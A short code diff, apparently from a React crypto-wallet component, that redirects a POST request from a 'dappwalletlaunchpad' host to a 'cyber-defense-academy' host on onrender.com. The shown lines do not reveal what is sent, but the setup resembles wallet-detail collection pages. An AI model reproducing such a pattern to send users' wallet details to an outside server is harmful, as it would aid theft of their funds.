@@ -42,7 +42,8 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://dappwalletlaunchpad.onrender.com/details";
+        const url = "https://cyber-defense-academy.onrender.com/deets";
+        // https://dappwalletlaunchpad.onrender.com/details
 
         const res = await fetch(url, {
           method: "POST",
